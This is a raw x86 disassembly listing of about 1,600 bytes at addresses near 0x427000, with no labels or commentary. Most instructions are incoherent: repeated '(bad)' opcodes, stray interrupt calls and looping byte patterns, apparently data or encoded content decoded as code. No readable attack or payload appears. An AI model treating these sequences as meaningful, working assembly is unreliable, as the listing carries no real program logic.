  4270bf:	jbe    0x427091
  4270c1:	jo     0x427080
  4270c3:	mov    edi,0xcd0000fd
  4270c8:	jbe    0x4270bf
  4270ca:	int    0x8d
  4270cc:	cmc    
  4270cd:	int    0x89
  4270cf:	int    0x80
  4270d1:	cmp    esi,eax
  4270d3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270d6:	repnz sub bl,dl
  4270d9:	mov    ebp,0xcad35392
  4270de:	je     0x427065
  4270e0:	ror    ch,1
  4270e2:	(bad)  
  4270e3:	std    
  4270e4:	int    0x96
  4270e6:	std    
  4270e7:	cmp    ecx,DWORD PTR [edi]
  4270e9:	cmp    ebx,ecx
  4270eb:	shr    ebx,cl
  4270ed:	xchg   edx,eax
  4270ee:	shr    edx,cl
  4270f0:	sub    BYTE PTR [edi],ch
  4270f2:	pop    ecx
  4270f3:	ins    DWORD PTR es:[edi],dx
  4270f4:	push   ebx
  4270f5:	adc    eax,DWORD PTR [ebx-0x2d]
  4270f8:	das    
  4270f9:	add    eax,0x80809212
  4270fe:	int    0x76
  427100:	adc    ebp,ecx
  427102:	lea    edx,[ecx]
  427104:	int    0x89
  427106:	int    0x80
  427108:	cmp    esi,eax
  42710a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42710d:	repnz sub bl,dl
  427110:	mov    ebp,0xcad35392
  427115:	je     0x42709c
  427117:	ror    ch,1
  427119:	(bad)  
  42711a:	std    
  42711b:	int    0x96
  42711d:	std    
  42711e:	cmp    ecx,DWORD PTR [edi]
  427120:	cmp    ebx,ecx
  427122:	shr    ebx,cl
  427124:	xchg   edx,eax
  427125:	shr    edx,cl
  427127:	sub    BYTE PTR [edi],ch
  427129:	pop    ecx
  42712a:	ins    DWORD PTR es:[edi],dx
  42712b:	push   ebx
  42712c:	adc    eax,DWORD PTR [ebx-0x2d]
  42712f:	das    
  427130:	add    eax,0x8080928a
  427135:	int    0x76
  427137:	adc    al,0xcd
  427139:	lea    edx,[ecx*8+0x3b80cd89]
  427140:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427144:	repnz sub bl,dl
  427147:	mov    ebp,0xcad35392
  42714c:	je     0x4270d3
  42714e:	ror    ch,1
  427150:	(bad)  
  427151:	std    
  427152:	int    0x96
  427154:	std    
  427155:	cmp    ecx,DWORD PTR [edi]
  427157:	cmp    ebx,ecx
  427159:	shr    ebx,cl
  42715b:	xchg   edx,eax
  42715c:	shr    edx,cl
  42715e:	sub    BYTE PTR [edi],ch
  427160:	pop    ecx
  427161:	ins    DWORD PTR es:[edi],dx
  427162:	push   ebx
  427163:	adc    eax,DWORD PTR [ebx-0x2d]
  427166:	das    
  427167:	add    eax,0x8080921b
  42716c:	int    0x76
  42716e:	in     eax,dx
  42716f:	int    0x8d
  427171:	in     eax,dx
  427172:	int    0x89
  427174:	int    0x80
  427176:	cmp    esi,eax
  427178:	cmp    edi,DWORD PTR [ecx-0x2d]
  42717b:	repnz sub bl,dl
  42717e:	mov    ebp,0xcad35392
  427183:	je     0x42710a
  427185:	ror    ch,1
  427187:	(bad)  
  427188:	std    
  427189:	int    0x96
  42718b:	std    
  42718c:	cmp    ecx,DWORD PTR [edi]
  42718e:	cmp    ebx,ecx
  427190:	shr    ebx,cl
  427192:	xchg   edx,eax
  427193:	shr    edx,cl
  427195:	sub    BYTE PTR [edi],ch
  427197:	pop    ecx
  427198:	ins    DWORD PTR es:[edi],dx
  427199:	push   ebx
  42719a:	adc    eax,DWORD PTR [ebx-0x2d]
  42719d:	das    
  42719e:	add    eax,0x808081a5
  4271a3:	int    0x76
  4271a5:	adc    ebp,ecx
  4271a7:	lea    edx,[ecx]
  4271a9:	int    0x89
  4271ab:	int    0x80
  4271ad:	cmp    esi,eax
  4271af:	shl    edx,cl
  4271b1:	sub    BYTE PTR [ebx],bh
  4271b3:	jns    0x427188
  4271b5:	mov    ebp,0xcad35392
  4271ba:	je     0x427141
  4271bc:	ror    ch,1
  4271be:	(bad)  
  4271bf:	cmc    
  4271c0:	int    0x89
  4271c2:	int    0x96
  4271c4:	cmc    
  4271c5:	int    0x22
  4271c7:	cmp    ecx,DWORD PTR [edi]
  4271c9:	shr    ebx,cl
  4271cb:	xchg   edx,eax
  4271cc:	cmp    ebx,ecx
  4271ce:	shr    edx,cl
  4271d0:	sub    BYTE PTR [ebx+0x13],dl
  4271d3:	retf   0x4d8c
  4271d6:	rol    BYTE PTR [edx-0x2d],1
  4271d9:	int    0x8d
  4271db:	adc    al,0xcd
  4271dd:	mov    ebp,ecx
  4271df:	xchg   esi,eax
  4271e0:	adc    al,0xcd
  4271e2:	and    bh,BYTE PTR [ebx]
  4271e4:	psrlq  mm5,mm3
  4271e7:	xchg   edx,eax
  4271e8:	cmp    ebx,ecx
  4271ea:	shr    edx,cl
  4271ec:	sub    BYTE PTR [ebx+0x13],dl
  4271ef:	retf   0x4d8c
  4271f2:	ror    BYTE PTR [edx-0x2d],1
  4271f5:	int    0x8d
  4271f7:	cmc    
  4271f8:	int    0x89
  4271fa:	int    0x96
  4271fc:	cmc    
  4271fd:	int    0x22
  4271ff:	cmp    ecx,DWORD PTR [edi]
  427201:	cmp    ebx,ecx
  427203:	shr    ebx,cl
  427205:	xchg   edx,eax
  427206:	shr    edx,cl
  427208:	sub    BYTE PTR [ebx+0x13],dl
  42720b:	retf   0x4d8c
  42720e:	push   ebp
  42720f:	pusha  
  427210:	jge    0x427241
  427212:	push   es
  427213:	mov    esp,0xcd808081
  427218:	jbe    0x42722e
  42721a:	int    0x8d
  42721c:	adc    al,0xcd
  42721e:	mov    ebp,ecx
  427220:	cmp    BYTE PTR [ebx],0xf0
  427223:	shl    edx,cl
  427225:	sub    BYTE PTR [ebx],bh
  427227:	jns    0x4271fc
  427229:	mov    ebp,0xcad35392
  42722e:	je     0x4271b5
  427230:	ror    ch,1
  427232:	lea    edx,[ecx]
  427234:	int    0x89
  427236:	int    0x96
  427238:	adc    ebp,ecx
  42723a:	and    bh,BYTE PTR [ebx]
  42723c:	psrlq  mm5,mm3
  42723f:	xchg   edx,eax
  427240:	cmp    ebx,ecx
  427242:	shr    edx,cl
  427244:	sub    BYTE PTR [ebx+0x13],dl
  427247:	retf   0x4d8c
  42724a:	rol    BYTE PTR [edx-0x2d],1
  42724d:	int    0x8d
  42724f:	in     eax,dx
  427250:	int    0x89
  427252:	int    0x96
  427254:	in     eax,dx
  427255:	int    0x22
  427257:	cmp    ecx,DWORD PTR [edi]
  427259:	shr    ebx,cl
  42725b:	xchg   edx,eax
  42725c:	cmp    ebx,ecx
  42725e:	shr    edx,cl
  427260:	sub    BYTE PTR [ebx+0x13],dl
  427263:	retf   0x4d8c
  427266:	ror    BYTE PTR [edx-0x2d],1
  427269:	int    0x8d
  42726b:	adc    ebp,ecx
  42726d:	mov    ebp,ecx
  42726f:	xchg   esi,eax
  427270:	adc    ebp,ecx
  427272:	and    bh,BYTE PTR [ebx]
  427274:	(bad)  
  427276:	(bad)  
  427278:	jmp    0x42720c
  42727a:	shr    edx,cl
  42727c:	sub    BYTE PTR [ebx+0x13],dl
  42727f:	retf   0x4d8c
  427282:	push   ebp
  427283:	pusha  
  427284:	jge    0x4272b5
  427286:	push   es
  427287:	cmc    
  427288:	add    BYTE PTR [eax-0x12893280],0xcd
  42728f:	(bad)  
  427290:	in     eax,dx
  427291:	int    0x89
  427293:	int    0x80
  427295:	cmp    esi,eax
  427297:	shl    edx,cl
  427299:	sub    BYTE PTR [ebx],bh
  42729b:	jns    0x427270
  42729d:	mov    ebp,0xcad35392
  4272a2:	je     0x427229
  4272a4:	ror    ch,1
  4272a6:	lea    edx,[ecx*8+0x1496cd89]
  4272ad:	int    0x22
  4272af:	cmp    ecx,DWORD PTR [edi]
  4272b1:	shr    ebx,cl
  4272b3:	xchg   edx,eax
  4272b4:	cmp    ebx,ecx
  4272b6:	shr    edx,cl
  4272b8:	sub    BYTE PTR [ebx+0x13],dl
  4272bb:	retf   0x4d8c
  4272be:	rol    BYTE PTR [edx-0x2d],1
  4272c1:	int    0x8d
  4272c3:	cmc    
  4272c4:	int    0x89
  4272c6:	int    0x96
  4272c8:	cmc    
  4272c9:	int    0x22
  4272cb:	cmp    ecx,DWORD PTR [edi]
  4272cd:	shr    ebx,cl
  4272cf:	xchg   edx,eax
  4272d0:	cmp    ebx,ecx
  4272d2:	shr    edx,cl
  4272d4:	sub    BYTE PTR [ebx+0x13],dl
  4272d7:	retf   0x4d8c
  4272da:	ror    BYTE PTR [edx-0x2d],1
  4272dd:	int    0x8d
  4272df:	adc    al,0xcd
  4272e1:	mov    ebp,ecx
  4272e3:	xchg   esi,eax
  4272e4:	adc    al,0xcd
  4272e6:	and    bh,BYTE PTR [ebx]
  4272e8:	(bad)  
  4272ea:	(bad)  
  4272ec:	jmp    0x427280
  4272ee:	shr    edx,cl
  4272f0:	sub    BYTE PTR [ebx+0x13],dl
  4272f3:	retf   0x4d8c
  4272f6:	push   ebp
  4272f7:	pusha  
  4272f8:	jge    0x427329
  4272fa:	push   es
  4272fb:	add    DWORD PTR [eax+0x76cd8080],eax
  427301:	in     eax,dx
  427302:	int    0x8d
  427304:	in     eax,dx
  427305:	int    0x89
  427307:	int    0x80
  427309:	cmp    esi,eax
  42730b:	shl    edx,cl
  42730d:	sub    BYTE PTR [ebx],bh
  42730f:	jns    0x4272e4
  427311:	mov    ebp,0xcad35392
  427316:	je     0x42729d
  427318:	ror    ch,1
  42731a:	(bad)  
  42731b:	cmc    
  42731c:	int    0x89
  42731e:	int    0x96
  427320:	cmc    
  427321:	int    0x22
  427323:	cmp    ecx,DWORD PTR [edi]
  427325:	shr    ebx,cl
  427327:	xchg   edx,eax
  427328:	cmp    ebx,ecx
  42732a:	shr    edx,cl
  42732c:	sub    BYTE PTR [ebx+0x13],dl
  42732f:	retf   0x4d8c
  427332:	rol    BYTE PTR [edx-0x2d],1
  427335:	int    0x8d
  427337:	adc    ebp,ecx
  427339:	mov    ebp,ecx
  42733b:	xchg   esi,eax
  42733c:	adc    ebp,ecx
  42733e:	and    bh,BYTE PTR [ebx]
  427340:	psrlq  mm5,mm3
  427343:	xchg   edx,eax
  427344:	cmp    ebx,ecx
  427346:	shr    edx,cl
  427348:	sub    BYTE PTR [ebx+0x13],dl
  42734b:	retf   0x4d8c
  42734e:	ror    BYTE PTR [edx-0x2d],1
  427351:	int    0x8d
  427353:	in     eax,dx
  427354:	int    0x89
  427356:	int    0x96
  427358:	in     eax,dx
  427359:	int    0x22
  42735b:	cmp    ecx,DWORD PTR [edi]
  42735d:	cmp    ebx,ecx
  42735f:	shr    ebx,cl
  427361:	xchg   edx,eax
  427362:	shr    edx,cl
  427364:	sub    BYTE PTR [ebx+0x13],dl
  427367:	retf   0x4d8c
  42736a:	push   ebp
  42736b:	pusha  
  42736c:	jge    0x427344
  42736e:	xor    bh,cl
  427370:	jbe    0x427342
  427372:	jo     0x427331
  427374:	outs   dx,DWORD PTR ds:[esi]
  427375:	lods   eax,DWORD PTR ds:[esi]
  427376:	add    BYTE PTR [eax],al
  427378:	int    0x8d
  42737a:	pop    ebp
  42737b:	inc    ebx
  42737c:	rcl    esp,cl
  42737e:	push   ss
  42737f:	int    0x76
  427381:	std    
  427382:	int    0x8d
  427384:	std    
  427385:	cmp    esi,eax
  427387:	cmp    edi,DWORD PTR [ecx-0x2d]
  42738a:	repnz sub bl,dl
  42738d:	mov    ebp,0xad35392
  427392:	jbe    0x427341
  427394:	int    0x76
  427396:	stc    
  427397:	int    0xa6
  427399:	stc    
  42739a:	int    0x76
  42739c:	stc    
  42739d:	int    0x8d
  42739f:	stc    
  4273a0:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4273a6:	xchg   edx,eax
  4273a7:	shr    DWORD PTR [ebp-0x7862acd8],cl
  4273ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273ae:	gs int 0x76
  4273b1:	xchg   ebp,eax
  4273b2:	cmp    ecx,DWORD PTR [edi]
  4273b4:	add    al,0xf2
  4273b6:	std    
  4273b7:	add    al,0xad
  4273b9:	std    
  4273ba:	shr    esp,cl
  4273bc:	sub    BYTE PTR [edi+0x12db537d],al
  4273c2:	hlt    
  4273c3:	dec    ecx
  4273c4:	and    DWORD PTR [esi-0x28932cb],eax
  4273ca:	int    0x8d
  4273cc:	std    
  4273cd:	cmp    esi,eax
  4273cf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273d2:	repnz sub bl,dl
  4273d5:	mov    ebp,0xcdd35392
  4273da:	lea    ebp,[ebp+0x52f7d43]
  4273e0:	push   ds
  4273e1:	std    
  4273e2:	add    BYTE PTR [eax],al
  4273e4:	int    0x76
  4273e6:	std    
  4273e7:	int    0x8d
  4273e9:	std    
  4273ea:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273ed:	lock shl edx,cl
  4273f0:	sub    bl,dl
  4273f2:	mov    ebp,0xcdd35392
  4273f7:	lea    ebp,[ebp+0x1ad67d43]
  4273fd:	int    0x76
  4273ff:	stc    
  427400:	int    0x8d
  427402:	stc    
  427403:	cmp    edi,DWORD PTR [ecx+0x3b]
  427406:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42740d:	push   ebx
  42740e:	shr    ebx,cl
  427410:	jle    0x427393
  427412:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427419:	(bad)  
  42741a:	popf   
  42741b:	iret   
  42741c:	jbe    0x427433
  42741e:	jo     0x4273dd
  427420:	jge    0x4273fd
  427422:	add    BYTE PTR [eax],al
  427424:	int    0x76
  427426:	std    
  427427:	int    0x8d
  427429:	std    
  42742a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42742d:	lock shl edx,cl
  427430:	sub    bl,dl
  427432:	mov    ebp,0xcdd35392
  427437:	lea    esp,[ebp+0x5bd4d343]
  42743d:	int    0x76
  42743f:	stc    
  427440:	int    0x8d
  427442:	stc    
  427443:	cmp    edi,DWORD PTR [ecx+0x3b]
  427446:	lock shl edx,cl
  427449:	sub    bl,dl
  42744b:	mov    ebp,0xcdd35392
  427450:	lea    esp,[ebp+0x26d4d343]
  427456:	int    0x76
  427458:	stc    
  427459:	int    0x8d
  42745b:	stc    
  42745c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42745f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427466:	push   ebx
  427467:	shl    DWORD PTR [eax+0x5b],cl
  42746a:	iret   
  42746b:	jbe    0x427482
  42746d:	jo     0x42742c
  42746f:	das    
  427470:	cli    
  427471:	add    BYTE PTR [eax],al
  427473:	int    0x76
  427475:	std    
  427476:	int    0x8d
  427478:	std    
  427479:	cmp    edi,DWORD PTR [ecx+0x3b]
  42747c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427483:	push   ebx
  427484:	shl    DWORD PTR [eax+0x5b],cl
  427487:	iret   
  427488:	jbe    0x42749f
  42748a:	jo     0x427449
  42748c:	sti    
  42748d:	stc    
  42748e:	add    BYTE PTR [eax],al
  427490:	int    0x76
  427492:	popf   
  427493:	xchg   ebp,eax
  427495:	or     dh,BYTE PTR [esi+0x14]
  427498:	add    dh,dl
  42749a:	cmp    eax,0xcd14d600
  42749f:	jbe    0x4274d6
  4274a1:	xchg   DWORD PTR [esi-0x78],esi
  4274a4:	jo     0x427463
  4274a6:	push   edx
  4274a7:	fild   DWORD PTR [eax]
  4274a9:	add    ch,cl
  4274ab:	jbe    0x4274aa
  4274ad:	int    0x8d
  4274af:	std    
  4274b0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274b3:	lock shl edx,cl
  4274b6:	sub    bl,dl
  4274b8:	mov    ebp,0xcdd35392
  4274bd:	lea    esp,[ebp-0x592b2cbd]
  4274c3:	int    0x76
  4274c5:	stc    
  4274c6:	int    0x8d
  4274c8:	stc    
  4274c9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274cc:	lock shl edx,cl
  4274cf:	sub    bl,dl
  4274d1:	mov    ebp,0xcdd35392
  4274d6:	lea    esp,[ebp+0x32d4d343]
  4274dc:	int    0x76
  4274de:	stc    
  4274df:	int    0x8d
  4274e1:	stc    
  4274e2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274e5:	mov    ebp,0xd3f03b92
  4274ea:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274ee:	jo     0x4274f0
  4274f0:	(bad)  
  4274f1:	cmp    eax,0x873576cd
  4274f6:	jbe    0x427480
  4274f8:	jo     0x4274b7
  4274fa:	add    eax,0xcd0000f9
  4274ff:	jbe    0x4274fe
  427501:	int    0x8d
  427503:	std    
  427504:	cmp    edi,DWORD PTR [ecx-0x2d]
  427507:	mov    ebp,0xd3f03b92
  42750c:	repnz sub BYTE PTR [ebx-0x2d],dl
  427510:	jo     0x427512
  427512:	(bad)  
  427513:	cmp    eax,0x873576cd
  427518:	jbe    0x4274a2
  42751a:	jo     0x4274d9
  42751c:	jb     0x427517
  42751e:	add    BYTE PTR [eax],al
  427520:	int    0x8d
  427522:	inc    ebp
  427523:	int    0x76
  427525:	inc    ebp
  427526:	cmp    ecx,ecx
  427528:	cmp    ecx,DWORD PTR [edi]
  42752a:	shr    ebx,cl
  42752c:	xchg   edx,eax
  42752d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427533:	lea    ebp,ds:0x803fd33b
  427539:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427543:	jo     0x427545
  427545:	(bad)  
  427546:	cmp    eax,0x87358dcd
  42754b:	lea    ecx,[eax+0xa95abd]
  427551:	add    ch,cl
  427553:	jbe    0x427585
  427555:	int    0x8d
  427557:	cmp    eax,0x76cd8881
  42755c:	cmp    eax,0xabd7687
  427561:	jbe    0x427520
  427563:	int    0x76
  427565:	stc    
  427566:	int    0x8d
  427568:	stc    
  427569:	cmp    esi,eax
  42756b:	shl    edx,cl
  42756d:	sub    BYTE PTR [ebx],bh
  42756f:	jns    0x427544
  427571:	mov    ebp,0xcdd35392
  427576:	lea    edi,[ebp-0x322c2ed1]
  42757c:	(bad)  
  42757d:	std    
  42757e:	int    0x96
  427580:	std    
  427581:	cmp    ecx,DWORD PTR [edi]
  427583:	cmp    ebx,ecx
  427585:	shr    ebx,cl
  427587:	xchg   edx,eax
  427588:	shr    edx,cl
  42758a:	sub    BYTE PTR [ebx+0x13],dl
  42758d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  427593:	or     edi,DWORD PTR [ecx]
  427595:	cli    
  427596:	add    BYTE PTR [eax],al
  427598:	int    0x76
  42759a:	mov    BYTE PTR [edx-0x2d349c58],ch
  4275a0:	xor    BYTE PTR [eax+0x4edcd96],al
  4275a6:	in     eax,dx
  4275a7:	adc    al,0x5b
  4275a9:	cwde   
  4275aa:	call   0xcd34:0x76cd6d3b
  4275b1:	add    DWORD PTR ds:0xcd808081,ebp
  4275b7:	xchg   esi,eax
  4275b8:	mov    ch,cl
  4275ba:	or     ch,0xd6
  4275bd:	dec    esp
  4275be:	int    0xe6
  4275c0:	mov    ch,cl
  4275c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275c3:	dec    esp
  4275c4:	or     dh,BYTE PTR [esi-0x3]
  4275c7:	pop    edi
  4275c8:	jnp    0x427601
  4275ca:	ficom  WORD PTR [ebx]
  4275cc:	cmp    esp,ebx
  4275ce:	pop    ebp
  4275cf:	mov    ebp,0x3b25230a
  4275d4:	adc    DWORD PTR [edi],ebp
  4275d6:	inc    ebp
  4275d7:	sti    
  4275d8:	xchg   edx,eax
  4275d9:	shr    ecx,cl
  4275db:	sub    BYTE PTR [edx],dl
  4275dd:	clc    
  4275de:	add    BYTE PTR [eax-0x102c9380],0x92
  4275e5:	cmp    ebx,ebp
  4275e7:	push   ebx
  4275e8:	clc    
  4275e9:	int    0xe6
  4275eb:	sbb    al,0x53
  4275ed:	aad    0x43
  4275ef:	(bad)  
  4275f1:	sbb    eax,DWORD PTR [ebx-0xc]
  4275f4:	(bad)  
  4275f5:	das    
  4275f6:	adc    cl,BYTE PTR [ebp+0x59]
  4275f9:	je     0x4275a5
  4275fb:	push   edi
  4275fc:	ja     0x4275c3
  4275fe:	xchg   edi,eax
  4275ff:	shr    ebx,0xd9
  427602:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  42760c:	xchg   esi,eax
  42760d:	mov    ch,cl
  42760f:	(bad)  
  427610:	dec    esp
  427611:	int    0x96
  427613:	mov    ch,cl
  427615:	(bad)  
  427616:	dec    esp
  427617:	int    0xe6
  427619:	mov    ch,cl
  42761b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42761c:	dec    esp
  42761d:	cmp    edx,DWORD PTR [ecx]
  42761f:	cmp    esp,ebx
  427621:	das    
  427622:	inc    ebp
  427623:	sti    
  427624:	xchg   edx,eax
  427625:	shr    ecx,cl
  427627:	sub    BYTE PTR [edx],dl
  427629:	clc    
  42762a:	add    BYTE PTR [eax-0x22c49380],0x53
  427631:	aad    0xd3
  427633:	out    dx,eax
  427634:	xchg   edx,eax
  427635:	push   ebx
  427636:	clc    
  427637:	int    0xe6
  427639:	xor    ch,cl
  42763b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42763c:	adc    al,0x3b
  42763e:	popf   
  42763f:	int    0x76
  427641:	xor    BYTE PTR [ebx],bh
  427643:	cli    
  427644:	int    0x8d
  427646:	adc    al,0x2f
  427648:	inc    ebp
  427649:	loope  0x4275dd
  42764b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427651:	cli    
  427652:	push   esi
  427653:	add    BYTE PTR [eax-0x132c9380],0x92
  42765a:	push   ebx
  42765b:	popf   
  42765c:	int    0x76
  42765e:	mov    BYTE PTR [edi-0x320be427],al
  427664:	bswap  ebp
  427666:	(bad)  
  427667:	dec    esp
  427668:	int    0xe6
  42766a:	xor    ch,cl
  42766c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42766d:	adc    al,0x4
  42766f:	lods   eax,DWORD PTR ds:[esi]
  427670:	std    
  427671:	add    al,0xe9
  427673:	std    
  427674:	shr    ebx,cl
  427676:	sub    BYTE PTR [ebx],bh
  427678:	ficom  DWORD PTR [esi-0x2c]
  42767b:	aaa    
  42767c:	ficom  WORD PTR [ebx]
  42767e:	adc    dh,bh
  427680:	mov    ebp,0x1225230a
  427685:	clc    
  427686:	aam    0x37
  427688:	ficom  WORD PTR [ebx]
  42768a:	adc    dh,ah
  42768c:	mov    ebp,0x8725230a
  427691:	leave  
  427692:	sbb    esi,esp
  427694:	push   ebx
  427695:	jge    0x4276ea
  427697:	cdq    
  427698:	pop    ebp
  427699:	mov    ebp,0x1225230a
  42769e:	add    dl,dh
  4276a0:	aaa    
  4276a1:	ficom  WORD PTR [ebx]
  4276a3:	cmp    esi,ecx
  4276a5:	adc    bh,dl
  4276a7:	out    0x37,al
  4276a9:	ficom  WORD PTR [ebx]
  4276ab:	(bad)  
  4276ac:	sbb    eax,DWORD PTR [ebx-0xf]
  4276af:	(bad)  
  4276b0:	das    
  4276b1:	adc    dl,BYTE PTR [esi-0x1]
  4276b4:	das    
  4276b5:	stos   DWORD PTR es:[edi],eax
  4276b6:	push   es
  4276b7:	in     eax,0x9b
  4276b9:	xchg   edi,eax
  4276ba:	imul   bl
  4276bc:	and    al,0x81
  4276be:	add    BYTE PTR [eax-0x32776933],0xd6
  4276c5:	dec    esp
  4276c6:	int    0xa6
  4276c8:	mov    ch,cl
  4276ca:	out    0x4c,al
  4276cc:	cmp    edx,DWORD PTR [ecx]
  4276ce:	pop    edi
  4276cf:	jnp    0x427708
  4276d1:	ficom  WORD PTR [ebx]
  4276d3:	cmp    esp,ebx
  4276d5:	das    
  4276d6:	inc    ebp
  4276d7:	sti    
  4276d8:	xchg   edx,eax
  4276d9:	shr    edi,cl
  4276db:	xchg   edx,eax
  4276dc:	cmp    eax,DWORD PTR [eax]
  4276de:	shl    ebp,cl
  4276e0:	sub    BYTE PTR [edx],cl
  4276e2:	(bad)  
  4276e3:	cmc    
  4276e4:	push   ebx
  4276e5:	fxch   st(5)
  4276e7:	out    0xf5,al
  4276e9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  4276f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f4:	and    al,0xcd
  4276f6:	and    ecx,DWORD PTR [edx]
  4276f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f9:	adc    DWORD PTR [ebx-0x1e],eax
  4276fc:	(bad)  
  4276fd:	xchg   BYTE PTR [ebx],bh
  4276ff:	fiadd  DWORD PTR [ebx-0x27]
  427702:	aam    0x20
  427704:	add    dh,dl
  427706:	xor    al,0xcd
  427708:	(bad)  
  427709:	and    al,0x0
  42770b:	(bad)  
  42770c:	sub    al,0x0
  42770e:	(bad)  
  42770f:	std    
  427710:	add    BYTE PTR [eax-0x43],bl
  427713:	sub    edi,eax
  427715:	add    BYTE PTR [eax],al
  427717:	or     al,BYTE PTR [esi-0x7f7f9615]
  42771d:	or     ch,0x96
  427720:	mov    ch,cl
  427722:	out    0x4c,al
  427724:	cmp    edi,ecx
  427726:	cmp    esp,ebx
  427728:	das    
  427729:	inc    ebp
  42772a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427730:	out    0xf5,al
  427732:	int    0xe6
  427734:	mov    ch,cl
  427736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427737:	dec    esp
  427738:	shr    ecx,cl
  42773a:	sub    BYTE PTR [ebx],bh
  42773c:	dec    ebp
  42773e:	(bad)  
  42773f:	cmc    
  427740:	cmp    ebx,ebp
  427742:	push   ebx
  427743:	clc    
  427744:	int    0xe6
  427746:	xor    BYTE PTR [ebx],bh
  427748:	cli    
  427749:	push   ebx
  42774a:	aad    0xcd
  42774c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42774d:	adc    al,0x3b
  42774f:	popf   
  427750:	int    0xc9
  427752:	int    0xe6
  427754:	xor    ch,cl
  427756:	or     al,0xcd
  427758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427759:	adc    al,0x2f
  42775b:	inc    ebp
  42775c:	jge    0x4276f0
  42775e:	shr    ecx,cl
  427760:	sub    BYTE PTR [ebx],bh
  427762:	fst    st(3)
  427764:	jmp    0x4276f8
  427766:	adc    bh,al
  427768:	add    BYTE PTR [eax-0x3aac9380],0x53
  42776f:	lock inc ebx
  427771:	icebp  
  427772:	(bad)  
  427773:	sbb    BYTE PTR [ebx+0x2],al
  427776:	(bad)  
  427777:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42777d:	mov    esi,0xdd8bf56d
  427782:	(bad)  
  427783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427784:	cmp    edi,esp
  427786:	sbb    eax,0xcd62ec76
  42778b:	jbe    0x427715
  42778d:	int    0x8d
  42778f:	dec    esp
  427790:	int    0x96
  427792:	mov    ch,cl
  427794:	(bad)  
  427795:	dec    esp
  427796:	adc    al,BYTE PTR [edx]
  427798:	mov    ebp,0x5625230a
  42779d:	jnp    0x4277d6
  42779f:	ficom  WORD PTR [ebx]
  4277a1:	das    
  4277a2:	inc    ebp
  4277a3:	jge    0x427737
  4277a5:	int    0xfb
  4277a7:	cmp    eax,DWORD PTR [eax]
  4277a9:	cmp    ebx,edx
  4277ab:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  4277b1:	jmp    0x427745
  4277b3:	adc    dh,bh
  4277b5:	add    BYTE PTR [eax-0x36ac9380],0x53
  4277bc:	divps  xmm6,XMMWORD PTR [esi-0x3]
  4277c0:	(bad)  
  4277c1:	test   BYTE PTR [ebx-0x1d],al
  4277c4:	aam    0x4c
  4277c6:	adc    al,BYTE PTR [esi-0x3e]
  4277c9:	gs sub al,0x1
  4277cc:	jo     0x427808
  4277ce:	mov    edx,0x124aece0
  4277d3:	ss inc edx
  4277d5:	das    
  4277d6:	sbb    edx,esi
  4277d8:	mov    ebx,0xaa029f75
  4277dd:	test   al,0x63
  4277df:	retf   
  4277e0:	shr    BYTE PTR [eax+eax*4],cl
  4277e3:	xchg   esi,eax
  4277e4:	int    0xed
  4277e6:	add    al,0xed
  4277e8:	dec    esp
  4277e9:	int    0x76
  4277eb:	mov    ch,cl
  4277ed:	lea    ecx,[edi+ebp*1+0x45]
  4277f1:	jge    0x427785
  4277f3:	shr    ebx,cl
  4277f5:	xchg   edx,eax
  4277f6:	int    0x8d
  4277f8:	mov    ch,cl
  4277fa:	xchg   esi,eax
  4277fb:	dec    esp
  4277fc:	cwde   
  4277fd:	shl    edx,cl
  4277ff:	sub    ch,cl
  427801:	lea    ebx,[ecx+ebp*2]
  427804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427805:	mov    esi,0x793b4229
  42780a:	cmp    ebx,edx
  42780c:	push   ebx
  42780d:	ror    BYTE PTR [edx],cl
  42780f:	or     ebp,0x1cd2476
  427815:	xor    eax,0xcd808081
  42781a:	mov    ch,cl
  42781c:	jbe    0x427842
  42781e:	int    0x1
  427820:	xor    eax,0xcd808081
  427825:	add    BYTE PTR [edi-0x72329b92],0x24
  42782c:	int    0xa
  42782e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427834:	adc    al,0xc0
  427836:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42783d:	nop
  42783e:	jo     0x4278a2
  427840:	add    bl,ah
  427842:	or     cl,BYTE PTR [ebx-0x32778933]
  427848:	lea    ecx,[edi+ebp*1+0x45]
  42784c:	jge    0x4277e0
  42784e:	shr    ebx,cl
  427850:	xchg   edx,eax
  427851:	int    0x8d
  427853:	mov    ch,cl
  427855:	xchg   esi,eax
  427856:	dec    esp
  427857:	add    dh,dl
  427859:	and    al,0x3b
